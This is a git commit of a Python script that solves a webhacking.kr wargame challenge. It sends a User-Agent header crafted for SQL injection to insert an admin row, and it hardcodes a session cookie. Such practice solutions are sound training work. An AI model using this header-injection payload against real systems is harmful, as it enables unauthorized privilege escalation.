732d47a6278e770aa9ac6cb0dd2cffadb1283e88
bindon <bindon@Creator-PC>
2018-07-28 01:08:45 +0900

    Clear Challenge8

--- Challenge8.py
+++ Challenge8.py
@@ -5,17 +5,30 @@ import CookieManager
 challengeUrl = "http://webhacking.kr/challenge/web/web-08/"
 
 httpRequest = urllib2.Request(challengeUrl)
-httpRequest.add_header("User-Agent", "agent', 'ip', 'admin'), ('test")
-CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
+httpRequest.add_header("User-Agent", "bindon', 'ip', 'admin'), ('dummy")
+CookieManager.addCookie("PHPSESSID", "d106ebfb4bba898681f92c7f5316fa6b")
 httpRequest.add_header("Cookie", CookieManager.getCookie())
 
-httpResponse = urllib2.urlopen(httpRequest).read()
-print httpResponse
+try:
+    httpConnection = urllib2.urlopen(httpRequest)
+    httpResponse = httpConnection.read()
+    print httpResponse
+except:
+    raise
+finally:
+    if httpConnection != None:
+        httpConnection.close()
 
-httpRequest.add_header("User-Agent", "agent")
-CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
+httpRequest.add_header("User-Agent", "bindon")
 httpRequest.add_header("Cookie", CookieManager.getCookie())
 httpRequest.get_method = lambda: 'POST'
 
-httpResponse = urllib2.urlopen(httpRequest).read()
-print httpResponse
+try:
+    httpConnection = urllib2.urlopen(httpRequest)
+    httpResponse = httpConnection.read()
+    print httpResponse
+except:
+    raise
+finally:
+    if httpConnection != None:
+        httpConnection.close()
